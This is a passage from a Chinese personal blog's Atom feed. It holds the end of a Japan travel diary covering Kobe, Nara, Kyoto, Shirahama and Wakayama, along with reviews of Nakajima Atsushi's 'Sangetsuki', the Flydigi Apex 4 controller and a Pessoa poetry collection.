<p>还有个题外话，新大阪站建的非常错综复杂，前前后后我在里面迷路了四五次。</p>
<p>今天的行程也是在小红书上找的路线，刨掉了些不感兴趣的后，按自己的计划略微重排了下。</p>
<p>由于没吃早饭，在三宫站下车后，先买了个华夫饼吃，味道还行，但是有点凉。去商业街的路上有魔爪的工作人员在发免费饮料，领了一罐 pipeline punch 味的。</p>
<p>随后吃了午饭，牛肉饭加上熟成牛肉，似乎都是神户牛，不过我没感受到太多不同……还喝了rokko beer 下叫BAYALE的一款IPA，感觉也就是还行的水平。日本整个市场上还是朝日和麒麟比较多，其他品牌没怎么见过。希望以后去北海道时，能尝一尝新鲜的小樽果酿。</p>
<p>之后偶然发现南京町有家蜜雪冰城，过去买了杯喝的，可惜没有我最喜欢的蜜桃四季春和柠檬水，只能单纯买了杯四季春，不过价钱确实算便宜。
<img src="https://s2.loli.net/2025/01/09/UXyFRjuGJZNt6fv.jpg" alt="MIXUE"></p>
<p>回到西安（误）
<img src="https://s2.loli.net/2025/01/09/gQzvyYD87KILcMq.jpg" alt="长安门">
<img src="https://s2.loli.net/2025/01/09/T54n8S6NwQjEA2g.jpg" alt="西安门"></p>
<p>之后去了神户港塔，不得不说离这种很高的建筑物很近时，很难拍的好看。在塔下面的美利坚公园还看到了当地摩托车队的表演。说起来这阵子我也刷到了不少摩托车的视频，不过国内的大城市基本都在禁摩，等个几年再考虑买一辆吧。</p>
<p>在美利坚公园消磨了些时间，坐在海边看了很久的海。还碰到了件很让人绷不住的事，<a href="https://www.bilibili.com/video/BV1HQBvYzEpb/">神户港塔下有大喇叭在播音乐，听到了 see you again</a>。临走前让旁边的大叔帮忙拍了照片，闲聊了几句，不过我日语不怎么样，只听出大叔似乎父辈去过上海/来自中国。</p>
<p><img src="https://s2.loli.net/2025/01/09/5yF8TOed1RKmx6P.jpg" alt="神户港塔">
<img src="https://s2.loli.net/2025/01/09/BjqVvbQtNxEl8nU.jpg" alt="神户港塔&amp;流萤"></p>
<p><img src="https://s2.loli.net/2025/01/09/IFNskbE6QmlHDLi.jpg" alt="美利坚公园"></p>
<p>随后便去了须磨。须磨的海与沙滩都很好看，而且几乎没什么人。唯一不爽的是公厕太少了，中午由于喝过啤酒和蜜雪冰城，下午好几次都想找但附近没有，很难受。</p>
<p><img src="https://s2.loli.net/2025/01/09/JaB61VGmCbokKUy.jpg" alt="两个颜色的一片海">
<img src="https://s2.loli.net/2025/01/09/CMrpzwiAghIY1ZE.jpg" alt=""></p>
<p><img src="https://s2.loli.net/2025/01/09/Rw81LcMGxJrgspz.jpg" alt=""></p>
<p>闲逛时还去旁边的水族馆附近转了转，不过由于需要门票就没进去。</p>
<p><img src="https://s2.loli.net/2025/01/09/4WuRtTsqlhwr2i6.jpg" alt="">
<img src="https://s2.loli.net/2025/01/09/MOK1FAmEhkWSwX6.jpg" alt="">
<img src="https://s2.loli.net/2025/01/09/N97V8zAQawWSPHC.jpg" alt=""></p>
<p>在回JR站的路上，偶然看到了街边有家<a href="https://jiyukoh.jp/">自由港书店</a>，进去大概看了看。日语书是看不懂了，不过看到了些设计上很有意思的书，以及画集、摄影集。最后买了本みなはむ的<a href="https://www.amazon.co.jp/%E9%A2%A8%E3%81%AE%E4%B8%AD-%E3%81%BF%E3%81%AA%E3%81%AF%E3%82%80%E4%BD%9C%E5%93%81%E9%9B%86-%E3%81%BF%E3%81%AA%E3%81%AF%E3%82%80/dp/4756257658">《風の中》</a>，便启程去了舞子。</p>
<p><img src="https://s2.loli.net/2025/01/09/k4OWT6doBmYFlj9.jpg" alt=""></p>
<p>在刷小红书时，看到了不少姐妹们称舞子比须磨好看的多，所以来之前我是有很高的期待的，尤其是我已经看过了须磨。只可惜舞子的景色撑不起如此高的期待。</p>
<p>在舞子看了很久的夕阳，喜欢大海，也喜欢日落。附近还有孙中山纪念馆，不过我去的有点晚，所以没能进去看。</p>
<p><img src="https://s2.loli.net/2025/01/09/7pDh5sFEz6PRX8Z.jpg" alt="">
<img src="https://s2.loli.net/2025/01/09/HyrSq1J7CKVmU8a.jpg" alt="">
<img src="https://s2.loli.net/2025/01/09/1nErQaztjZUiIST.jpg" alt=""></p>
<p>看完夕阳后便回到了大阪，特意去吃了号称大阪第一的<a href="https://www.jinrui-minamenrui.com/">人類のみな麵類</a>，不过没觉得特别到离谱的棒的水平。一开始到的时候还以为门口没人排队，店员指了一下才发现队伍在店面远处的墙边，有点尴尬。在店本身是 cash only 的情况下，菜品的价格非常有零有整，让我拿到了旅途全程中最多的硬币，我要给个大大的差评。</p>
<h1 id="day-3-奈良">Day 3 奈良</h1>
<p>day 3奈良，依旧是小红书上看了看大概有什么景点。去之前和朋友聊时，就有人跟我讲没什么玩的，以及若草山鹿粪较多，所以我的期待整体是偏低的，但是没想到奈良能比我想象的更加无聊。</p>
<p>到奈良后已经中午了，先去了汉国神社看了看，没人，除了招牌和供奉人之外，就是日本神社的典型样子。之后先是买了些甜点垫了垫肚子，不过还是饿，便去吃了顿 Mos Burger。</p>
<p><img src="https://s2.loli.net/2025/01/09/OTCRGJ17LKY6Sca.jpg" alt=""></p>
<p>汉堡的味道还不错，就是我不会日语、店员英语一般，我按惯例要求不加沙拉酱时，和店员花了点时间沟通。语言不通情况下，想做一些特殊要求确实麻烦。洋葱圈不如国内汉堡王。</p>
<p>兴福寺没什么意思，五重塔因为在修缮，所以围了起来，没看到。</p>
<p><img src="https://s2.loli.net/2025/01/09/MuXUGtLRiNK1sId.jpg" alt=""></p>
<p>随后去了奈良国立博物馆，新馆没开门，有些遗憾，只看了佛像馆和青铜器馆。</p>
<p>佛像馆内的佛像、佛头非常令人大开眼界，只是能否拍照的标识非常随机，没想明白为啥有些可以，另外一些就不行。还看到了有人在佛像前练习素描，瞥了一眼画的很好，尊重他人隐私所以没拍照。</p>
<p>青铜器馆内基本都是河南、陕西出土的，略有不爽。</p>
<p>然后是东大寺。东大寺门外便有很多鹿，途中还见到了鹿之间打架、鹿顶人、鹿把不该吃的给抢了之类的事。东大寺进去还要门票，且排队队伍略长，考虑到本身也是重建 的，索性没有进去。</p>
<p><img src="https://s2.loli.net/2025/01/09/sAG6djZfvcHy8mC.jpg" alt="">
<img src="https://s2.loli.net/2025/01/09/UpxdAQaPrRmJ4Ol.jpg" alt=""></p>
<p>春日大社进出都需要走很长一段路，而且没啥意思。出来时原本计划按谷歌地图导航坐公交，结果工作人员说公交当天停运了，很不爽。</p>
<p>随后去了当天唯一有意思的地方：圣地巡礼。风略大，打了卡后便走了。
<img src="https://s2.loli.net/2025/01/09/lIjshORUZ2x3NgY.jpg" alt=""></p>
<p>晚饭吃的饺子王将，煎饺不错，回锅肉完全不像回锅肉，反倒是甜口的，如果不叫回锅肉的话我对这道菜的评价会高很多。</p>
<h1 id="day-4-京都">Day 4 京都</h1>
<p>这一天的安排是进行 <a href="https://movie.douban.com/subject/30401194/">HELLO WORLD</a> 的圣地巡礼。</p>
<p>中午先吃了顿<a href="https://maps.app.goo.gl/HzTVtpxAPM67o4Ay8">鲷白汤</a>，点的是招牌鲷白汤，里边姜或柠檬的味道很棒，但略浓，想喝汤的话还是建议点清汤。</p>
<p><img src="https://s2.loli.net/2025/01/09/2u3qROBMrGhnfQ7.jpg" alt="鲷白汤拉面"></p>
<p>随后便前往了京都，JR京都站是真的大，在找大楼梯时迷路了一阵子。</p>
<p><img src="https://s2.loli.net/2025/01/09/FvgJrQBYywf7t4i.jpg" alt="">
随后是一些其他的圣地巡礼照片：</p>
<p><img src="https://s2.loli.net/2025/01/09/XhIVSE5bPO1cRA4.jpg" alt=""></p>
<p><img src="https://s2.loli.net/2025/01/09/jR9vpeKCY7Athbs.jpg" alt="">
（这个场景在电影里是罗森，现实中是711）</p>
<p><img src="https://s2.loli.net/2025/01/09/RjZrO2xCWXF6G5e.jpg" alt="">
<img src="https://s2.loli.net/2025/01/09/63qyFu2frTokgdY.jpg" alt=""></p>
<p>京都的公交车真的很贵。</p>
<p>似乎是不多见的用像素字体的招牌
<img src="https://s2.loli.net/2025/01/09/n6odx1DHryZQGuq.jpg" alt=""></p>
<p>以及另外两个颇有意思的
<img src="https://s2.loli.net/2025/01/09/Bs6SbEfivJUM2F9.jpg" alt=""></p>
<p><img src="https://s2.loli.net/2025/01/09/MnlQvb5ZVkr3HcB.jpg" alt=""></p>
<p>在鸭川坐了好一会儿
<img src="https://s2.loli.net/2025/01/09/BLu21iaQTmEed63.jpg" alt="">
<img src="https://s2.loli.net/2025/01/09/JU9LRHPEv61jpcG.jpg" alt=""></p>
<p>晚上才到了伏见稻荷大社，但由于没什么特别的登顶理由且太晚了，爬了一点点便打道回府了。
<img src="https://s2.loli.net/2025/01/09/atYCKGSNEI1mxny.jpg" alt=""></p>
<p>在京都闲逛时，不知是我没去游客区还是什么原因，让我感觉京都非常的不旅游城市，游客相关的设施建设、本地特色小吃铺或纪念品店等都没怎么见到，走过一片又一片的街区时，甚至商铺都没见多少。</p>
<h1 id="day-5-京都--宇治">Day 5 京都 &amp; 宇治</h1>
<p>由于几个想去的地方都已经去过了，且昨天没有打卡完 HELLO WORLD，索性去了京都 &amp; 宇治闲逛。</p>
<p>在新大阪出发时，发现平时总是排队很多人的道顿堀くくる章鱼小丸子没人在排队，买了一份。到了京都后，现在站外吃完了小丸子，感觉味道也就一般水平。</p>
<p>随后去附近的 BIC Camera 转了转，在线下看到了不少难得见到的东西：</p>
<p><img src="https://s2.loli.net/2025/01/09/dgb6tQAmj1h3Exp.jpg" alt="">
轨迹球+键盘，其他的轨迹球没拍照
<img src="https://s2.loli.net/2025/01/09/6LESBxb21GjciQO.jpg" alt="">
tourbox</p>
<p>随后前往了东寺，由于基本还没吃饭，所以在路边找了家<a href="https://maps.app.goo.gl/AW7NGQRQSXbvSHcx8">店</a>吃饭，小店很传统，店员是父子两人，儿子会一点点英语，但菜单就别想了，导致我第一次迫不得已用上了翻译程序。吃了顿炸鸡饭，喝了杯啤酒，和两位略微聊了聊。</p>
<p><img src="https://s2.loli.net/2025/01/09/mCxpLHIaDvGOhgq.jpg" alt=""></p>
<p><img src="https://s2.loli.net/2025/01/09/TVUZqHGSpW2Ylg1.jpg" alt=""></p>
<p>随后前往了京都动画。</p>
<p><img src="https://s2.loli.net/2025/01/09/6fITXh42buy5cBD.jpg" alt=""></p>
<p>之后在宇治转了转，打卡了朝雾桥。
<img src="https://s2.loli.net/2025/01/09/sqxWrLOec6PhaYz.jpg" alt="">
由于来的太晚，游客案内所刚好已经关门了，没能进去看 hello world 的立牌（不过可能里边也都没摆了）</p>
<p>当地的抹茶冰淇淋不如蜜雪冰城。</p>
<p>原来打算晚餐吃一顿萨莉亚的，结果由于回去时走了另一条路，没想起来这事。回到了京都站后去附近吃了顿大阪烧。这是我整趟行程中做的最错误的决定，也是吃到的最难吃的一顿饭。
<img src="https://s2.loli.net/2025/01/09/XAOkKNt3jYTZvc5.jpg" alt=""></p>
<p>不过在唐吉诃德买到了很可爱的卡比周边（就不拍自己的了）。</p>
<p><img src="https://s2.loli.net/2025/01/09/bZdwPnRemAaLpxO.jpg" alt=""></p>
<h1 id="day-6-白滨">Day 6 白滨</h1>
<p>这一天去了白滨，一路上其实没太多有意思的，而且天气很差，所以就不放照片了。</p>
<p>中午先去了新大阪站内的大阪烧肉松屋，这次终于没迷路了。味道还不错，就是不知道和那个连锁的松屋是啥关系。</p>
<p>到达白滨时的天气很差，下了大雨。</p>
<p>晚上顶着狂风暴雨长途跋涉，想去吃一个蓝色的咖喱，但是没开门……于是在附近吃了一个不太好吃的烧烤。店里还遇到了一对中年中国夫妇，帮他们要了份ご飯（我的日语水平也仅限于此了），临走前和他们说了几句话，一致认为这家店真的不好吃。</p>
<p>回酒店的路上吃了个gelato，味道还不错。谷歌地图评分更是高达5.0（因为只有一条评价）</p>
<p>晚上去酒店的海景浴场泡了澡，只可惜都是黑的没看到什么。（凭直觉穿的浴衣，感觉像是哪里没搞对，有时候会往下掉）</p>
<h1 id="day-7-和歌山">Day 7 和歌山</h1>
<p>这天的天气不错，起床后在海滩拍了点照片。
<img src="https://s2.loli.net/2025/01/09/LMy51HKEAopUx32.jpg" alt=""></p>
<p>从酒店回JR白滨站的路上，坐公交经过了とれとれ市場，这个中文翻译真的太棒了。
（但你应该也能意识到英文翻译完全不可用，后面从和歌山去机场的路上，还经过了和歌山大学前/Wakayama-Daigakumae，嗯……）
<img src="https://s2.loli.net/2025/01/09/inNFlUtkuP9dMG1.jpg" alt="">
<img src="https://s2.loli.net/2025/01/09/8tMCFuY2Q7faEBo.jpg" alt="NBA"></p>
<p>在白滨站前吃了顿汉堡，Google地图上的评分很高。汉堡很棒、薯条也不错，但是蛋形塑料杯里的可乐很一般。另外就是不知道日本人对于溏心蛋的执念到底有多强，里边的煎蛋边缘都有点焦黑了，但是蛋黄还是溏心的。
<img src="https://s2.loli.net/2025/01/09/nFb79eUdrkKglpR.jpg" alt="">
随后便去了和歌山。
到和歌山后，当时先想去坐电车换乘，但由于下一班要等太久了，于是想着出站坐公交，这时候还发现了日本电车系统一个问题，大多数轨道交通系统基本都是不支持同站进出的，不过国内一般是会扣一笔钱，但日本会直接拒绝掉。当时找工作人员处理费了好一番功夫。</p>
<p>先去了和歌山城，感觉很千篇一律，我之前去过了名古屋城、大阪城，感觉可能不来更省时间。。。
<img src="https://s2.loli.net/2025/01/09/2HC6ozQpbTFnxSB.jpg" alt=""></p>
<p>但下面的和歌山城公园动物园很可爱，可惜当天临时休园了。</p>
<p><img src="https://s2.loli.net/2025/01/09/LIVD68bhml3FBKp.jpg" alt="">
<img src="https://s2.loli.net/2025/01/09/dImksRSyVZ5JuEG.jpg" alt="">
<img src="https://s2.loli.net/2025/01/09/gW31Fh6qTGPcesH.jpg" alt=""></p>
<p>这座城市又多了一个伤心的人。
<img src="https://s2.loli.net/2025/01/09/BNnU8OScIwtTCFL.jpg" alt=""></p>
<p>快落日时，回酒店去了顶楼的露天浴场，一边泡澡、一边看落日，非常惬意。（也没有照片）</p>
<h1 id="day-8-和歌山--临空城--大阪-上海">Day 8 和歌山 &amp; 临空城 &amp; 大阪-&gt;上海</h1>
<p>最后一天是返程了，不过飞机很晚才起飞，酒店退房又偏早，所以找了些地方消磨时间。</p>
<p>先是在和歌山市民图书馆转了转，偶然走进了中国相关的馆内，拿起了本汉诗集读，其中巨势识人的《秋日别友》：林业翩翩秋日曛，行人独向边山云。<strong>唯余天际孤悬月，万里流光远送君。</strong> 非常喜欢，最近在找一些国内出版社的日本汉诗集子，期待后续有时间读一读。</p>
<p>随后便乘坐JR去了临空城，打算在海边消磨些时间。谁成想到了后又遇到了狂风暴雨。在躲雨时候主动和旁边的韩国人聊了起来，两个人用凑合的英语和一点点翻译软件聊了很久，相谈甚欢。还发现了他用的充电宝竟然也是酷态科的。</p>
<p>随后便去了KIX，T2航站楼不太行，春秋航空也是很不行，体验都很一般。在这里我要再次向香港快线的工作人员小姐姐道歉。</p>
<p><img src="https://s2.loli.net/2025/01/10/m7pbWlVg4yDGnPA.jpg" alt="">
<img src="https://s2.loli.net/2025/01/09/lWqw7s5ATQB9kPy.jpg" alt="">
<img src="https://s2.loli.net/2025/01/09/4mIuRFp3v1x5G92.jpg" alt=""></p>
]]></content></entry><entry><title type="html">读了《山月记》</title><link href="https://blog.batkiz.com/posts/san-getsu-ki/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/san-getsu-ki/</id><published>2024-12-16T01:26:10+08:00</published><updated>2024-12-16T01:26:10+08:00</updated><content type="html"><![CDATA[<p>最近靠睡前与在各种交通工具上的时间，断断续续地读完了《山月记》，<a href="https://book.douban.com/subject/30394154/">果麦出品的三秦出版社本</a>。</p>
<h1 id="来自中国典籍的故事">来自中国典籍的故事</h1>
<p>前面几篇基本都是中短篇，其中大部分更近乎寓言，读起来并无障碍，挑着讲一些。</p>
<h2 id="名人传">名人传</h2>
<p>取之于《列子》中「纪昌学射」一节，中岛敦扩写了不少心中感悟，整体与通行版本并无不同，唯独最后的「奇闻」，颇有大音希声或心无挂碍，究竟涅槃之意。</p>
<h2 id="悟净出世--悟净探异">悟净出世 &amp; 悟净探异</h2>
<p>两篇情节上可认为是连续的，均是写的西游一行人中沙悟净之故事。</p>
<p>悟净出世是本书中我最为喜欢的一篇，悟净在探寻「我是什么」这一问题答案的过程中，先后拜访了诸多各不相同的大师，最终于混混沌沌之中获得了感悟。其中悟净遭逢观音颇有守得云开见月明之感。</p>
<h2 id="弟子">弟子</h2>
<p>弟子一篇讲的是孔子七十二徒之一的子路。</p>
<p>比较意外的是从文中得知了「君子死、冠不免」竟是子路的事迹。</p>
<p>中间孔子提到困厄于陈蔡之时，脑海中响起了</p>
<blockquote>
<p>孔夫子无食困陈蔡，多亏了范丹老祖把粮帮。</p>
<p>借你们吃，借你们穿，借来了米山和面山，直到如今没还完。</p>
</blockquote>
<p>呃……这种联想还是不要来了（</p>
<h2 id="汉诗六首">汉诗六首</h2>
<p>将汉诗放到这里一起说。</p>
<p>六首中最为喜欢的是第一首《早春下利根川》，全诗附于下面：</p>
<blockquote>
<p>水上黄昏欲雨天，春寒抱病下长川。</p>
<p>菰荻未萌凫鸭罕，不似江南旧画船。</p>
</blockquote>
<p>之前在和歌山市民图书馆也读了些别的汉诗，希望有空时能找个不错的集子好好读一下。</p>
<h1 id="南太平洋">南太平洋</h1>
<p>上面的几篇均是较为熟悉的中国典籍故事，下面的篇章突然转到南太平洋时颇有些不适应。</p>
<h2 id="夫妇">夫妇</h2>
<p>颇有意思，算是歌颂了自由爱情？</p>
<h2 id="光--风--梦">光 · 风 · 梦</h2>
<p>读时没注意「一段叙述夹一段主人公日记」的介绍，开篇读的很一头雾水，所幸再读了一些后看明白了文体安排，想一想应该是第一次见这样的。</p>
<p>本篇算是本书中唯一的中长篇，花了好久才读完。内容就不在这里多嘴了，写一些读时觉得有意思的：</p>
<ul>
<li>文中出现了不少萨摩亚土语之音译，有些到后面都不太记得清是啥意思，日本人对于片假名运用之多，想来没有我这样的障碍吧。</li>
<li>文中曾莫名其妙出现了 <em>year bill</em> 这个英文词汇，也无注释，不知是何用意。</li>
<li>中岛敦对于拉丁文、法语及史蒂文森相关著作信手拈来，不知这一篇做了多少准备方才写就。</li>
<li>文中有一部分以史蒂文森之想法比较了《克拉丽莎》和《鲁滨逊漂流记》，现在前书确实是几乎没什么相关内容，搜了下似乎甚至没中文版。</li>
</ul>
<p>读后确实感受到了一个有血有肉的史蒂文森，情节及「史蒂文森」的自我反思均非常不错。对南太平洋也非常感兴趣，不知何时能安排一次出游。</p>
<p>另外我至今还没读过《金银岛》，看来最好安排个时间看一看。</p>
<h1 id="后记">后记</h1>
<p>写这篇文章时，去豆瓣查了些资料，这才发现中岛敦竟是《文豪野犬》漫画的主人公。大约七八年前曾看过一些章节，如今却丝毫没有记忆了，是否也该学一学中岛敦或是史蒂文森，多记录、多写作呢？</p>
<hr>
<p>编辑：最近逛书店发现了另一家出版社的版本，虽然是一样的名字，但少了《光·风·梦》、多了《妖氛录》。好在《妖氛录》一文不长，在店里用样书读完了。真的很不喜欢这种多个版本的中短篇选集共用一个名字，但是内容略有不同的情况，非常之混乱。相比之下，江苏凤凰文艺出版社出版的<a href="https://book.douban.com/subject/36028353/">忧梦集</a>一书，虽然也是选自费尔南多·佩索阿的惶然录系列手稿，但是选文与国内之前的几本《惶然录》有很大的不同，命名也做了区分，值得点赞。</p>
]]></content><category scheme="https://blog.batkiz.com/tags/%E8%AF%BB%E4%B9%A6" term="%E8%AF%BB%E4%B9%A6" label="读书"/></entry><entry><title type="html">飞智八爪鱼 4 体验</title><link href="https://blog.batkiz.com/posts/flydigi-apex-4/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/flydigi-apex-4/</id><published>2024-12-10T17:16:00+08:00</published><updated>2024-12-10T17:16:00+08:00</updated><content type="html"><![CDATA[<blockquote>流萤手柄</blockquote><p><img src="https://s2.loli.net/2024/12/10/kJvIAjugaty13eT.webp" alt=""></p>
<h1 id="背景">背景</h1>
<p>今年早些时候，无意间关注到了国产手柄突飞猛进的「进化」，便打算买一把来扩充装备库。</p>
<p>当时的选择基于以下考虑：</p>
<ul>
<li>计划购买中高端产品：我已经有 Xbox Series 手柄与 PS5 DualSense 手柄（下文中简称为 Xbox 手柄与 PS5 手柄），买偏低端产品的话，最终的体验预计也就是伯仲之间，我更希望新的手柄能够给我带来些不一样的体验</li>
<li>要有背键：其实这一条已经被上面一条几乎包含了，现在很难看到没背键的中高端产品，不过形式可能不太一样</li>
<li>基于个人好恶排除了一些品牌：这个就不细讲了</li>
</ul>
<p>上面的条件列出来后，其实基本已经锁定飞智八爪鱼4这款产品了，只是恰巧看到了崩坏·星穹铁道中流萤款<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>的八爪鱼4手柄，便下单了手柄+充电底座套装。后面等了三个多月，才终于拿到手。</p>
<h1 id="体验">体验</h1>
<h2 id="参数">参数</h2>
<p>近些年我越发没时间去了解各种电子产品的硬件区分，且很多参数已经到了产生了边际递减效应（比如鼠标的 4000 Hz 轮询率与 8000Hz轮询率），这里快速过下参数：</p>
<ul>
<li>1000Hz轮询率</li>
<li>力反馈扳机</li>
<li>微动ABXY</li>
<li>力调节合金摇杆</li>
<li>四颗背键，可以在驱动软件内配置按键映射、宏映射等</li>
</ul>
<p>以及另外一些有的没的：</p>
<ul>
<li>一个可以播放 gif 图、调整部分配置的小屏幕</li>
<li>传承飞智传统但是对我来说没有任何作用的手机支架预留孔位</li>
<li>体感功能，配 NS / 模拟器中需要体感 时会比较好，不过这两个我都没试过</li>
</ul>
<h2 id="实际体验">实际体验</h2>
<p>接下来是实际的体验环节</p>
<h3 id="充电底座">充电底座</h3>
<p>这里要给一个差评，底座使用了与小米手环类似的触点供电，但是却没有磁吸，手柄放上底座时总是需要再小心地对准才能充上电，便利性不佳。</p>
<p><strong>更新：</strong> 有人做出了 <a href="https://makerworld.com.cn/zh/models/681321#profileId-627633">3D 打印模型</a> 可以极大提高充电成功率，非常好用。</p>
<h3 id="手柄本体">手柄本体</h3>
<p>手柄握在手里很重，我是不太会把这把手柄带出门去。</p>
<p>微动按键体验起来确实新奇。</p>
<p>手柄的前面板是磁吸上去的透明塑料，这里给个好评，如果出现了剐蹭等问题，买个新的换起来很方便。但与之相对的：小屏幕的三角区是两面材质，很粘指纹，不耐脏；握把后背也是某种类肤橡胶材质，很容易发黄。</p>
<h3 id="力反馈扳机--震动">力反馈扳机 &amp; 震动</h3>
<p>体验确实很牛逼，比之 Xbox 与 PS5 手柄仅在部分有适配的游戏内拥有力反馈相比，可以在驱动程序中自行开启及自定义模式确实方便了不少，而且也能充分发挥硬件带来的卓越体验。</p>
<p>但是（非第一方的）适配带来了另一个问题：扳机键在游戏的不同场景下拥有不同的作用，强行开启某个力反馈模式时，在一些边角场景会不舒服。比如Windows 中玩 极限竞速：地平线5 时，仅在加速、刹车时会有扳机震动<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>，地图界面中便是普通的扳机体验；以及 PS5 中原神仅在钓鱼场景有扳机震动，其他场景仍是普通体验。不过这里属于无伤大雅的小事，第三方配件厂毕竟没有第一方的号召力，可以理解。（又检查了下驱动，发现有些软件可以借用PS5手柄的自适应，也算是不得已的办法了）</p>
<p>震动并没有太多的不同，不过在玩原神时发现了一个奇怪的现象：万叶的E技能触发时及落地时，均会有震动。其中Xbox手柄的震动是最强的，PS5手柄与八爪鱼4均弱了很多，八爪鱼4 的震动强度在驱动程序中可以调整，但是即使调到最大，力度比起Xbox手柄仍有所不如。</p>
<h3 id="背键">背键</h3>
<p>没到手时觉得这个背键的键位有点奇怪，实际上手后并没有不适应，不过比较容易触发到长按。</p>
<p>此外还有一个小问题：手柄的形态目前业已固定，即使是第一方，对于背键也还只是浅尝辄止。这也就导致了第三方手柄的背键只能映射到现有的abxy等键，或是通过驱动来使用宏，而无法直接在游戏内将功能直接分配到新的背键。不过这点与上述的力反馈一样，非第一方来做确实难办。</p>
<p>此外，飞智的驱动软件中仅给了四个配置文件槽位，无法自行新增。虽说配置文件在手柄内有存储，通过小屏幕也可以快捷切换，但是我更想要的，还是驱动内可以通过监测软件来自动切换不同的配置文件。这里可能有人会提出飞智已做了适配的几十款游戏，但是除去这些，还有太多游戏飞智无法主动适配，还是希望能更加优化下实际的使用体验。</p>
<h1 id="总结">总结</h1>
<p>飞智八爪鱼4这款手柄基本满足了我的期待，除去充电底座难以对准之外，其他的各种缺点也是在意料之中，甚至还给了我些惊喜。流萤款的联名也非常好看，总体来讲是一次很满意的购物（但预售真的让我等了太久了）。对于国产手柄有兴趣的朋友们不妨也考虑考虑、试一试。</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>这款手柄在官方页面看不出一点的飞智八爪鱼痕迹，官方的商品名也是【流萤 力反馈精英手柄】，我仔细观察了详情及看了网友评论才确定这是八爪鱼4，飞智在这里纯纯代工厂（但好消息是不用看飞智的logo了）。&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>是的，没想到吧，Xbox 手柄竟然有扳机震动，似乎只有少部分游戏才有适配，我也是玩了极限竞速：地平线5之后才发现的。&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content></entry><entry><title type="html">想象一朵未来的玫瑰</title><link href="https://blog.batkiz.com/posts/envision-a-roseforthcoming/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/envision-a-roseforthcoming/</id><published>2024-08-26T23:54:24+08:00</published><updated>2024-08-26T23:54:24+08:00</updated><content type="html"><![CDATA[<p>最近利用睡前时间把费尔南多·佩索阿的《想象一朵未来的玫瑰》读完了，写一些读后感。不过好久没有写功能性文档之外的文字了，还望海涵。</p>
<p>其实最早听到《想象一朵未来的玫瑰》，是在《崩坏：星穹铁道》中，这是一个剧情很不错的游戏内任务。不过当时做了之后也没再想太多，直到前阵子出门逛书店，才发现了竟然有本这个标题的书，索性便读了一读。</p>
<p>我读诗比较少，上次（竟已是七八年前了）完整读完的还是聂鲁达的<a href="https://book.douban.com/subject/1045352/">《 二十首情诗与绝望的歌》</a> ，「今晚我可以写出最悲哀的诗」，现在想想还有些怀念。前些日子还读了一点点<a href="https://book.douban.com/subject/30320036/">《穿裤子的云》</a> ，不过没能读下去……</p>
<p>回到题目上，佩索阿给了我一种非常「近」的感觉，本书中佩索阿并未写太多情诗，但行文遣词依然极为浪漫，比如：</p>
<blockquote>
<p>我的心略大于整个宇宙。
——《我下了火车》</p>
</blockquote>
<blockquote>
<p>我把它永远葬在心里，全部的时间，所有的宇宙
——《糟糕的夜里，每晚的实质》</p>
</blockquote>
<blockquote>
<p>在每片宿命的碎镜中，我只看到一小片我
——《重游里斯本（1926）》</p>
</blockquote>
<blockquote>
<p>我开始明白我自己。我不存在。<br>
我是我想成为的那个人和别人把我塑造成的那个人之间的裂缝。
——《我开始明白我自己》</p>
</blockquote>
<blockquote>
<p>“万物皆与我们不同，所以它们存在”</p>
</blockquote>
<p>除了浪漫外，佩索阿的诗也极为「现实」，其诸多思索与现代人几乎没有任何距离，相信许多人来读时，不免产生切身之感。如其中的颓靡与奋进之言：</p>
<blockquote>
<p>整理生活，把意志和行动搁在架子上……<br>
我现在如此，也曾一直想如此，结果却都一样。
——《省略号》</p>
</blockquote>
<blockquote>
<p>我和所有人一样平庸。<br>
这样的问题无解，自杀也没用。
——《夜晚，我走在郊外的街道上》</p>
</blockquote>
<blockquote>
<p>精神病院的病人至少算个人。<br>
我是一个没有精神病院的精神病人。
——《这古老的苦闷》</p>
</blockquote>
<blockquote>
<p>问题是要解决的，而不是担心。<br>
&hellip;<br>
卷起文明的袖子，<br>
伸进脏土！<br>
也比操心别人的灵魂更值得去做。
——《可怜的朋友，我对你无可同情》</p>
</blockquote>
<blockquote>
<p>如果从自己接受的感受之中<br>
分散注意，就等于失去了自己。
——《十四行三章（选二）》</p>
</blockquote>
<p>老实讲，可能是因为缺少了太多康德、黑格尔抑或 18 世纪哲学的知识，我对佩索阿关于形而上的思辨看得半懂不懂，最后的《无政府主义银行家》更是弯弯绕绕。</p>
<p>但这丝毫没有妨碍我在阅读时，与这位不属于任何地方的诗人，产生了一次又一次共鸣，在破碎的镜中看到无数的自己。</p>
<p>倘若让佩索阿来到一个世纪之后，不知这位不属于任何地方的诗人又会产生什么样的思辨，写出怎样的诗。</p>
<hr>
<p>最后以「想象一朵未来的玫瑰」的出处作结吧：</p>
<p>《现实》</p>
<p>是的，二十年前我常来这里……<br>
这一片城区没有什么变化——<br>
或者是我看不出来。</p>
<p>二十年前！<br>
那时的我！是的，那会儿的我不同……<br>
二十年前，这些房屋又知道些什么……</p>
<p>二十段无用的年华（我不知道是否如此！<br>
我怎么知道什么有用，什么没用？）……<br>
二十段失去的年华（不过赢得它们又是什么意思？）</p>
<p>我试图在脑子里重建<br>
当我常来这儿的时候我是谁，我是怎样的，<br>
二十年前……<br>
我不记得。我记不得。<br>
那时候常来这里的那个人<br>
也许记得，如果他还存在的话……<br>
相比二十年前经过这里的那个我，<br>
我对很多小说里的人物更为熟识！</p>
<p>是的，时光的神秘。<br>
是的，对任何事都一无所知。<br>
是的，所有船上诞生的人们，<br>
是的，是的，所有这些，或别的说法……</p>
<p>和从前一模一样的二楼窗口，<br>
常有一个比我还大的穿蓝衣服的女孩探身出来。<br>
她现在怎样了？<br>
对一无所知的事，我们可以任意想象。<br>
我处于一个身体和道德上的停滞：我宁愿不去想象……</p>
